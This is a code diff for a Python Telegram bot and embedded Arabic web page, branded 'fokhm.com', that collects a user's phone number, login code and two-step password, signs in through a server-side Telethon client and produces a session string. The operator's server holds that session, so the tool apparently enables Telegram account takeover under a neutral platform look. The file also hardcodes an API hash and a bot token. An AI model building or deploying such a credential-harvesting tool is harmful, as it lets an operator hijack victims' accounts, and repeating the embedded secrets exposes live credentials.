@@ -13,10 +13,10 @@ API_ID = 25757508
 API_HASH = '3091fbda91d4b133207779ddf81fee39'
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8828318815:AAEJ63XFWpwwuigCWuO_-Hu94sJVyhgn338")
 
-# تخزين مؤقت لجلسات تيليثون قيد التشغيل لكل مستخدم
+# تخزين الجلسات المؤقتة لكل مستخدم في الذاكرة
 active_sessions = {}
 
-# واجهة تطبيق الويب المصغر (Telegram Web App)
+# واجهة Web App كاملة تطلب الرقم والكود وكلمة المرور من داخل الصفحة نفسها
 WEB_APP_HTML = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -32,47 +32,32 @@ WEB_APP_HTML = """
         button { width: 95%; padding: 10px; background: #2563eb; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; font-weight: bold; margin-top: 10px; }
         button:hover { background: #1d4ed8; }
         .msg { color: #f87171; font-size: 14px; margin-bottom: 10px; }
-        .success { color: #4ade80; font-size: 14px; word-break: break-all; background: #0f172a; padding: 10px; border-radius: 6px; }
+        .success { color: #4ade80; font-size: 13px; word-break: break-all; background: #0f172a; padding: 10px; border-radius: 6px; text-align: left; direction: ltr; max-height: 150px; overflow-y: auto; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2>فخم - استخراج الجلسة</h2>
+        <h2>منصة fokhm.com</h2>
         <div id="content">
-            <p>انقر أدناه لمشاركة رقم هاتفك وبدء العملية:</p>
-            <button onclick="requestPhone()">📱 مشاركة رقم الهاتف</button>
+            <p>أدخل رقم هاتفك مع رمز الدولة (مثال: +966...):</p>
+            <input type="text" id="phone_val" placeholder="+966xxxxxxxxx">
+            <button onclick="submitPhone()">إرسال الكود</button>
         </div>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
+        let currentUserId = tg.initDataUnsafe?.user?.id || 'web_user_' + Math.random();
 
-        function requestPhone() {
-            if (tg.requestContact) {
-                tg.requestContact((shared, contact) => {
-                    if (shared && contact) {
-                        sendDataToBackend('phone', '+' + contact.phone_number);
-                    } else {
-                        alert("عذراً، يجب مشاركة الرقم للمتابعة.");
-                    }
-                });
-            } else {
-                // بديل في حال المتصفح الخارجي
-                let phone = prompt("أدخل رقم هاتفك مع رمز الدولة (مثال: +966...):");
-                if (phone) sendDataToBackend('phone', phone);
-            }
-        }
-
-        function sendDataToBackend(action, value, extra = "") {
+        function callApi(action, value) {
             fetch('/api', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    action: action, 
-                    value: value, 
-                    extra: extra,
-                    user_id: tg.initDataUnsafe?.user?.id || 'web_user'
+                    action: action,
+                    value: value,
+                    user_id: currentUserId
                 })
             })
             .then(res => res.json())
@@ -83,28 +68,39 @@ WEB_APP_HTML = """
                             <input type="text" id="code_val" placeholder="12345">
                             <button onclick="submitCode()">تأكيد الكود</button>`;
                 } else if (data.status === 'need_password') {
-                    html = `<p>الحساب محمي بتحقق ثنائي (2FA)، أدخل كلمة المرور:</p>
+                    html = `<p>الحساب محمي بكلمة مرور (تحقق بخطوتين):</p>
                             <input type="password" id="pass_val" placeholder="كلمة المرور">
-                            <button onclick="submitPassword()">تأكيد كلمة المرور</button>`;
+                            <button onclick="submitPassword()">تحقق</button>`;
                 } else if (data.status === 'done') {
-                    html = `<h3 style="color: #4ade80;">✅ تمت العملية بنجاح!</h3>
-                            <p>هذه هي جلسة حسابك (انسخها واحفظها مكان آمن):</p>
+                    html = `<h3 style="color: #4ade80;">✅ تمت العملية بنجاح يا فخم!</h3>
+                            <p>نسخ جلسة حسابك:</p>
                             <div class="success">${data.session}</div>`;
                 } else {
-                    html = `<p class="msg">${data.message}</p><button onclick="location.reload()">إعادة المحاولة</button>`;
+                    html = `<p class="msg">${data.message}</p>
+                            <p>أدخل رقم هاتفك مجدداً:</p>
+                            <input type="text" id="phone_val" placeholder="+966xxxxxxxxx">
+                            <button onclick="submitPhone()">إرسال الكود</button>`;
                 }
                 document.getElementById('content').innerHTML = html;
             });
         }
 
+        function submitPhone() {
+            let phone = document.getElementById('phone_val').value;
+            if(!phone) { alert("أدخل الرقم أولاً"); return; }
+            callApi('phone', phone);
+        }
+
         function submitCode() {
             let code = document.getElementById('code_val').value;
-            sendDataToBackend('code', code);
+            if(!code) { alert("أدخل الكود أولاً"); return; }
+            callApi('code', code);
         }
 
         function submitPassword() {
             let pass = document.getElementById('pass_val').value;
-            sendDataToBackend('password', pass);
+            if(!pass) { alert("أدخل كلمة المرور أولاً"); return; }
+            callApi('password', pass);
         }
     </script>
 </body>
@@ -155,10 +151,11 @@ def api():
                 session_str = client.session.save()
                 return {"status": "done", "session": session_str}
             except Exception as e:
-                if "SessionPasswordNeededError" in str(e):
+                err_str = str(e)
+                if "SessionPasswordNeededError" in err_str or "password" in err_str.lower():
                     return {"status": "need_password"}
                 else:
-                    return {"status": "error", "message": str(e)}
+                    return {"status": "error", "message": err_str}
 
         elif action == 'password':
             session_data = active_sessions.get(user_id)
@@ -181,17 +178,17 @@ def api():
 
     return {"status": "error", "message": "طلب غير معروف"}
 
-# --- أوامر بوت تيليجرام لفتح الـ Web App ---
+# --- أمر البوت لفتح الـ Web App فقط ---
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     web_url = os.getenv('RENDER_EXTERNAL_URL', 'wahm0.onrender.com')
     if not web_url.startswith('http'):
         web_url = f"https://{web_url}"
         
-    keyboard = [[InlineKeyboardButton("🚀 فتح تطبيق استخراج الجلسة", web_app=WebAppInfo(url=web_url))]]
+    keyboard = [[InlineKeyboardButton("🚀 فتح منصة fokhm.com", web_app=WebAppInfo(url=web_url))]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(
-        "أهلاً بك يا فخم في بوت منصة `fokhm.com`\n\nاضغط على الزر أدناه لفتح تطبيق الويب وتسجيل الدخول بسلاسة:",
+        "أهلاً بك يا فخم في بوت منصة `fokhm.com`\n\nاضغط على الزر أدناه لفتح تطبيق الويب وتسجيل الدخول بالكامل من داخله:",
         reply_markup=reply_markup,
         parse_mode="Markdown"
     )
@@ -200,13 +197,15 @@ def run_flask():
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), use_reloader=False)
 
 if __name__ == '__main__':
+    # تشغيل سيرفر الويب في الخلفية
     flask_thread = threading.Thread(target=run_flask)
     flask_thread.daemon = True
     flask_thread.start()
     
+    # تشغيل بوت تيليجرام
     application = ApplicationBuilder().token(BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start_command))
     
-    print("Fokhm WebApp Bot is running...")
+    print("Fokhm Pure WebApp Bot is running...")
     application.run_polling()
 
